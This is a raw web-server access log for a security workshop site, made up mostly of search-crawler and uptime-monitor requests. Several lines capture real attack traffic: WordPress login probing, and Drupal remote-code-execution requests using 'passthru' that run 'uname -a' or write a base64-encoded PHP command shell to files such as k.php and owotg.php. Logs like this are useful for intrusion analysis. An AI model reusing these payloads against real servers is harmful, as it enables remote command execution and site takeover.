www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:49:12 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.147 - - [29/Apr/2018:17:49:24 -0400] "GET /papers/2009/nspw2009-probst.pdf HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 180.76.15.11 - - [29/Apr/2018:17:50:24 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:51:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 41.142.213.243 - - [29/Apr/2018:17:52:15 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.142.213.243 - - [29/Apr/2018:17:52:21 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.34 - - [29/Apr/2018:17:52:24 -0400] "GET /2009/proceedings/2013/nspw2013-zhao.pdf HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:52:40 -0400] "GET /papers/2005/nspw2005-flechais.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:53:03 -0400] "GET /2010/cfp HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 180.76.15.6 - - [29/Apr/2018:17:53:24 -0400] "GET /2018/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 80.234.138.32 - - [29/Apr/2018:17:53:47 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 80.234.138.32 - - [29/Apr/2018:17:53:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:17:54:04 -0400] "GET /2002/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:17:54:22 -0400] "GET /papers/1996/nspw1996-zurko.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:17:56:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.26 - - [29/Apr/2018:17:59:17 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:00:11 -0400] "GET /2009/registration.content HTTP/1.1" 302 579 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 138.201.60.47 - - [29/Apr/2018:18:01:11 -0400] "GET / HTTP/1.1" 302 469 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:01:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.137 - - [29/Apr/2018:18:04:27 -0400] "GET /current/cfp/nspw2018-cfp.pdf HTTP/1.1" 302 548 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:04:42 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.138 - - [29/Apr/2018:18:05:27 -0400] "GET /2005/nspw-small.jpg HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 94.134.38.195 - - [29/Apr/2018:18:06:18 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:06:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 94.134.38.195 - - [29/Apr/2018:18:06:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:06:25 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.7 - - [29/Apr/2018:18:06:27 -0400] "GET /papers/1999/?C=N;O=A HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:08:09 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:09:52 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 178.221.0.209 - - [29/Apr/2018:18:09:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.221.0.209 - - [29/Apr/2018:18:09:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:11:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:11:35 -0400] "GET /papers/2006/nspw2006-naegoe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:13:19 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:15:02 -0400] "GET /2009/proceedings/2001/nspw2001-brostoff.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 42.111.128.123 - - [29/Apr/2018:18:15:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 42.111.128.123 - - [29/Apr/2018:18:15:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:16:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:16:45 -0400] "GET /papers/1993/nspw1993-slack.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 41.35.81.221 - - [29/Apr/2018:18:17:26 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.35.81.221 - - [29/Apr/2018:18:17:29 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.236 - - [29/Apr/2018:18:17:45 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:20:12 -0400] "GET /2007/submission.content.2006 HTTP/1.1" 302 585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:21:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 ::1 - - [29/Apr/2018:18:21:35 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:21:55 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:18:22:40 -0400] "GET /2004/?C=N;O=A HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:23:39 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:26:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 109.242.178.221 - - [29/Apr/2018:18:26:19 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.242.178.221 - - [29/Apr/2018:18:26:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 199.16.157.180 - - [29/Apr/2018:18:26:40 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.180 - - [29/Apr/2018:18:26:41 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 185.234.217.11 - - [29/Apr/2018:18:29:36 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=uname+-a HTTP/1.1" 302 669 "-" "curl/7.35.0"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:18:30:25 -0400] "GET /2006/cfp.shtml HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:30:32 -0400] "GET /papers/2009/nspw2009-tuerpe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:31:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.141.114.148 - - [29/Apr/2018:18:31:23 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 178.73.215.171 - - [29/Apr/2018:18:32:04 -0400] "GET / HTTP/1.0" 302 492 "-" "-"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:33:59 -0400] "GET /2005/cfp/latex/main.tex HTTP/1.1" 302 575 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [29/Apr/2018:18:35:07 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [29/Apr/2018:18:35:07 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:35:42 -0400] "GET /papers/2002/nspw2002-haldar.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:36:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:39:09 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:40:52 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:41:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:42:36 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:18:43:20 -0400] "GET /2008/dates.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:44:19 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:18:45:19 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 ::1 - - [29/Apr/2018:18:45:22 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:46:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:18:48:32 -0400] "GET /2009/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 40.77.167.28 - - [29/Apr/2018:18:51:11 -0400] "GET /papers/1997/nspw1997-riechmann.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:51:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 124.122.204.144 - - [29/Apr/2018:18:51:22 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 124.122.204.144 - - [29/Apr/2018:18:51:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:18:52:56 -0400] "GET /papers/2013/nspw2013-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:18:54:39 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.149.67 - - [29/Apr/2018:18:56:11 -0400] "GET /papers/2009/?C=M;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:18:56:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:58:06 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [29/Apr/2018:18:58:54 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 59.124.153.166 - - [29/Apr/2018:18:58:54 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 189.11.88.20 - - [29/Apr/2018:18:59:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 189.11.88.20 - - [29/Apr/2018:18:59:06 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:18:59:49 -0400] "GET /2009/proceedings/1993/nspw1993-lin.pdf HTTP/1.1" 302 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:19:00:18 -0400] "GET /papers/2011/nspw2011%E2%80%90feigenbaum.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:01:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:03:31 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:03:31 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:03:31 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:03:31 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:19:04:59 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:06:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:06:21 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:06:21 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:06:21 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:06:21 -0400] "POST /loikfd.php HTTP/1.1" 302 495 "-" "curl/7.47.0"
www.nspw.org:80 178.73.215.171 - - [29/Apr/2018:19:06:35 -0400] "GET / HTTP/1.0" 302 492 "-" "-"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:19:06:42 -0400] "GET /2009/proceedings/2013/nspw2013-ashenden.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 211.115.79.122 - - [29/Apr/2018:19:08:34 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:19:08:55 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:19:08:55 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [29/Apr/2018:19:08:55 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:11:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:19:12:58 -0400] "GET /2000/past.html HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:16:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 65.49.2.175 - - [29/Apr/2018:19:16:31 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Go-http-client/1.1"
www.nspw.org:80 65.49.2.175 - - [29/Apr/2018:19:16:31 -0400] "GET /2012/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [29/Apr/2018:19:16:43 -0400] "GET / HTTP/1.1" 302 469 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [29/Apr/2018:19:16:58 -0400] "GET /2009/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [29/Apr/2018:19:17:01 -0400] "GET /node/70 HTTP/1.1" 302 487 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:19:17:02 -0400] "GET /2002/nspw-header.html HTTP/1.1" 302 571 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 42.236.150.86 - - [29/Apr/2018:19:17:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 42.236.150.86 - - [29/Apr/2018:19:17:16 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 40.77.167.28 - - [29/Apr/2018:19:17:33 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 54.36.148.240 - - [29/Apr/2018:19:17:52 -0400] "GET /1999/14.jpg HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
